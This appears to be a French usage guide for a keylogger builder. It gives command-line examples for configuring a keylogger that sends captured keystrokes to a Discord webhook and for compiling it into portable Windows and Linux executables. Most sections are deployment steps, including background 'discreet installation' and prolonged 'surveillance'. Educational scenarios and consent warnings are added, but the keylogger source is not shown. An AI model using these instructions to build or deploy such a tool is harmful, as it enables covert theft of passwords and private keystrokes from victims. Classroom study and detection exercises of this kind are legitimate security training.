# 📚 Exemples d'Utilisation

## Exemple 1 : Build Basique

```bash
# Installation
pip install -r requirements.txt

# Build interactif
python builder.py

# Entrer le webhook quand demandé
# Exemple: https://discord.com/api/webhooks/123456789/abcdefghijklmnop

# Choisir intervalle: 60
# Choisir type: 1 (script Python)

# Exécuter
python build/keylogger_configured.py
```

## Exemple 2 : Build en Ligne de Commande

```bash
# Build rapide avec paramètres
python builder.py "https://discord.com/api/webhooks/123456789/abcdefghijklmnop" 30 my_keylogger.py

# Exécuter
python build/my_keylogger.py
```

## Exemple 3 : Créer un Exécutable Windows

```bash
# Mode interactif
python builder.py

# Configuration
Webhook: https://discord.com/api/webhooks/123456789/abcdefghijklmnop
Intervalle: 60
Type de build: 2 (exécutable)
Nom: keylogger.exe

# L'exécutable sera créé dans build/dist/keylogger.exe
# Vous pouvez le copier sur n'importe quel PC Windows (même sans Python)
```

## Exemple 4 : Créer un Exécutable Linux

```bash
python builder.py

# Configuration
Webhook: https://discord.com/api/webhooks/123456789/abcdefghijklmnop
Intervalle: 60
Type de build: 2 (exécutable)
Nom: keylogger

# L'exécutable sera créé dans build/dist/keylogger
chmod +x build/dist/keylogger
./build/dist/keylogger
```

## Exemple 5 : Test dans une VM

```bash
# Sur votre machine principale
python builder.py "https://discord.com/api/webhooks/YOUR_WEBHOOK" 30 test.py

# Copier vers la VM
scp build/test.py user@vm-ip:/home/user/
scp requirements.txt user@vm-ip:/home/user/

# Sur la VM
pip install -r requirements.txt
python test.py

# Observer les logs sur Discord
```

## Exemple 6 : Configuration pour Intervalle Court

```bash
# Pour tests rapides (envoi toutes les 10 secondes)
python builder.py "https://discord.com/api/webhooks/YOUR_WEBHOOK" 10 quick_test.py

python build/quick_test.py
```

## Exemple 7 : Configuration pour Intervalle Long

```bash
# Pour surveillance prolongée (envoi toutes les 5 minutes)
python builder.py "https://discord.com/api/webhooks/YOUR_WEBHOOK" 300 long_monitor.py

python build/long_monitor.py
```

## Exemple 8 : Test Complet sur Environnement de Lab

```bash
# Environnement de cybersécurité éducatif

# 1. Créer un serveur Discord de test
# 2. Créer un webhook nommé "Lab-Keylogger"
# 3. Build le keylogger

python builder.py

Webhook: https://discord.com/api/webhooks/YOUR_LAB_WEBHOOK
Intervalle: 45
Type: 1 (script)

# 4. Déployer sur machine de test
python build/keylogger_configured.py

# 5. Simuler activité utilisateur
# 6. Observer les rapports sur Discord
# 7. Analyser les données capturées
# 8. Documenter pour votre rapport de lab
```

## Exemple 9 : Compilation Multi-Plateforme

```bash
# Sur Linux - compiler pour Linux
python builder.py
# Choisir option 2 (exécutable)
# Résultat: build/dist/keylogger (Linux)

# Sur Windows - compiler pour Windows
python builder.py
# Choisir option 2 (exécutable)
# Résultat: build/dist/keylogger.exe (Windows)
```

## Exemple 10 : Utilisation avec Différents Webhooks

```bash
# Build pour environnement de dev
python builder.py "https://discord.com/api/webhooks/DEV_WEBHOOK" 30 keylogger_dev.py

# Build pour environnement de test
python builder.py "https://discord.com/api/webhooks/TEST_WEBHOOK" 60 keylogger_test.py

# Build pour environnement de prod (lab autorisé)
python builder.py "https://discord.com/api/webhooks/PROD_WEBHOOK" 120 keylogger_prod.py
```

## 🎯 Scénarios d'Utilisation Éducatifs

### Scénario 1 : Démonstration en Classe

**Objectif** : Montrer comment fonctionnent les keyloggers

```bash
# Préparation
python builder.py "WEBHOOK" 15 demo_class.py

# En classe
1. Projeter l'écran
2. Lancer: python build/demo_class.py
3. Taper des exemples de texte
4. Montrer les logs Discord après 15 secondes
5. Expliquer les mécanismes de défense
```

### Scénario 2 : Exercice de Détection

**Objectif** : Apprendre à détecter les keyloggers

```bash
# Installation discrète sur VM de test
./build/dist/keylogger &

# Les étudiants doivent:
1. Détecter le processus (ps aux | grep keylogger)
2. Identifier le trafic réseau (netstat, wireshark)
3. Analyser les connexions sortantes
4. Proposer des méthodes de mitigation
```

### Scénario 3 : Analyse de Malware

**Objectif** : Comprendre les techniques de malware

```bash
# Analyse du code
cat keylogger.py

# Questions à répondre:
- Comment capture-t-il les frappes?
- Comment communique-t-il avec l'extérieur?
- Quelles sont ses signatures détectables?
- Comment peut-on le détecter/bloquer?
```

## 💡 Conseils de Test

1. **Toujours tester dans un environnement isolé**
   ```bash
   # Créer une VM de test
   # Installer le keylogger
   # Faire des tests
   # Détruire la VM après
   ```

2. **Garder un log de vos tests**
   ```bash
   # Documenter chaque test
   echo "Test #1 - $(date)" >> test_log.txt
   ```

3. **Vérifier les permissions**
   ```bash
   # Linux: vérifier les groupes
   groups

   # Windows: vérifier les privilèges
   whoami /priv
   ```

## ⚠️ Avertissements

- Ne JAMAIS utiliser sur des systèmes non autorisés
- Toujours avoir un consentement ÉCRIT
- Utiliser uniquement dans un contexte ÉDUCATIF
- Respecter la vie privée et les lois locales

---

Pour plus d'informations, consultez le [README](README.md)
